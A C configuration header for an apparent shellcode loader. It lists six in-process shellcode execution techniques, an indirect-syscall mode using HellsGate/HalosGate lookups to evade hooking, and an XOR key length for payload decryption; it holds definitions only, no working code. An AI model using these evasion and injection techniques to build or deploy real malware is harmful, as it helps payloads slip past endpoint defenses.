#ifndef CONFIG_H
#define CONFIG_H

/*
 * Loader build configuration.
 * Edit these values or override them with -D flags at compile time.
 */

/* --- Technique selection ---
 *  0 = createthread     NtCreateThreadEx
 *  1 = enum_windows     EnumWindows callback
 *  2 = timer_queue      CreateTimerQueueTimer callback
 *  3 = apc_self         NtQueueApcThread + NtTestAlert (self-inject)
 *  4 = fiber            ConvertThreadToFiber + CreateFiber
 *  5 = section_map      NtCreateSection + NtMapViewOfSection (dual-map)
 */
#ifndef DEFAULT_TECHNIQUE
#define DEFAULT_TECHNIQUE 5
#endif

/* --- Syscall mode ---
 * Set to 1 to resolve NT functions through HellsGate/HalosGate
 * SSN lookup and execute via a syscall;ret gadget inside ntdll
 * (indirect syscalls).
 *
 * Set to 0 to resolve NT functions with GetProcAddress
 * (direct ntdll calls).
 */
#define USE_INDIRECT_SYSCALLS 1

/* --- Payload decryption ---
 * XOR key length in bytes for shellcode decryption.
 */
#ifndef XOR_KEY_LEN
#define XOR_KEY_LEN 16
#endif

#endif /* CONFIG_H */
